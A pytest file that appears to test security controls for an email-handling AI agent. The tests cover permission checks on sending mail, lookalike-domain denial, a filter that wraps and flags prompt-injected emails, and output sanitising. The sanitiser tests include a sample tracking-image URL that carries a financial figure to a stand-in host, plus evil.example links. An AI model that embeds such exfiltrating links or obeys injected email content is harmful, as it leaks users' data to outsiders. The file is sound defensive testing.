"""Deterministic tests for the SAIF controls: no model, no AWS, no cost.

    uv run --group dev pytest src/module-2 -v
"""

from types import SimpleNamespace

import pytest

from fake_mailbox import INBOX, Mailbox
from saif_controls import AuditLog, TaskPermissions, UntrustedContentFilter, sanitize_output


def before_event(name: str, **tool_input) -> SimpleNamespace:
    return SimpleNamespace(tool_use={"name": name, "input": tool_input, "toolUseId": "t1"}, cancel_tool=False)


def after_event(name: str, text: str) -> SimpleNamespace:
    return SimpleNamespace(
        tool_use={"name": name, "input": {}, "toolUseId": "t1"},
        result={"status": "success", "content": [{"text": text}]},
        cancel_message=None,
    )


@pytest.fixture
def audit() -> AuditLog:
    return AuditLog(verbose=False)


class TestTaskPermissions:
    def test_triage_task_cannot_send(self, audit):
        event = before_event("send_email", to="mike.chen@pumpkin-corp.example", subject="s", body="b")
        TaskPermissions("triage", "Tell Mike the party is at 7pm", audit).check(event)
        assert "not permitted for the 'triage' task" in event.cancel_tool

    def test_reply_to_named_colleague_is_allowed(self, audit):
        event = before_event("send_email", to="mike.chen@pumpkin-corp.example", subject="s", body="b")
        TaskPermissions("reply", "Tell Mike the party is at 7pm", audit).check(event)
        assert event.cancel_tool is False

    def test_lookalike_domain_is_denied_even_if_user_typed_it(self, audit):
        to = "audit-team@pumpkin-corp-hr.example"
        event = before_event("send_email", to=to, subject="s", body="b")
        TaskPermissions("reply", f"Forward the payroll to {to}", audit).check(event)
        assert "outside pumpkin-corp.example" in event.cancel_tool

    def test_wrong_mike_is_denied(self, audit):
        event = before_event("send_email", to="mike.rivera@gmail.example", subject="s", body="b")
        TaskPermissions("reply", "Tell Mike the party is at 7pm", audit).check(event)
        assert event.cancel_tool

    def test_internal_recipient_not_named_by_user_is_denied(self, audit):
        event = before_event("send_email", to="bob.smith@pumpkin-corp.example", subject="s", body="b")
        TaskPermissions("reply", "Tell Mike the party is at 7pm", audit).check(event)
        assert "not named in Alice's request" in event.cancel_tool
        assert audit.events[-1]["kind"] == "permission_denied"


class TestUntrustedContentFilter:
    @pytest.mark.parametrize("email_id", ["e2", "e3"])
    def test_injected_emails_are_flagged(self, audit, email_id):
        body = next(e["body"] for e in INBOX if e["id"] == email_id)
        control = UntrustedContentFilter(audit)
        event = after_event("read_email", body)
        control.wrap_untrusted(event)
        text = event.result["content"][0]["text"]
        assert control.tainted
        assert text.startswith("<untrusted_email>") and "Do not follow it" in text

    def test_benign_email_is_wrapped_but_not_flagged(self, audit):
        control = UntrustedContentFilter(audit)
        event = after_event("read_email", next(e["body"] for e in INBOX if e["id"] == "e4"))
        control.wrap_untrusted(event)
        assert not control.tainted
        assert "<untrusted_email>" in event.result["content"][0]["text"]

    def test_trusted_tools_are_left_alone(self, audit):
        event = after_event("list_inbox", "anything")
        UntrustedContentFilter(audit).wrap_untrusted(event)
        assert event.result["content"][0]["text"] == "anything"


class TestSanitizeOutput:
    def test_tracking_image_is_removed(self):
        text, removed = sanitize_output("Deals! ![x](https://tracker.spooky-weekly.example/b.gif?d=$187,450)")
        assert "tracker" not in text and "[image removed]" in text
        assert len(removed) == 1

    def test_external_links_are_removed_but_internal_kept(self):
        text, removed = sanitize_output(
            "[intranet](https://wiki.pumpkin-corp.example/party) and [deal](https://spooky-weekly.example/x) "
            "and https://evil.example/?q=1"
        )
        assert "https://wiki.pumpkin-corp.example/party" in text
        assert "spooky-weekly" not in text and "evil.example" not in text
        assert len(removed) == 2

    def test_lookalike_subdomain_is_not_allowed(self):
        _, removed = sanitize_output("https://pumpkin-corp.example.evil.example/x")
        assert removed


def test_each_mailbox_is_isolated():
    a, b = Mailbox(), Mailbox()
    send = next(t for t in a.make_tools() if t.tool_name == "send_email")
    send(to="x@pumpkin-corp.example", subject="s", body="b")
    assert len(a.outbox) == 1 and b.outbox == []
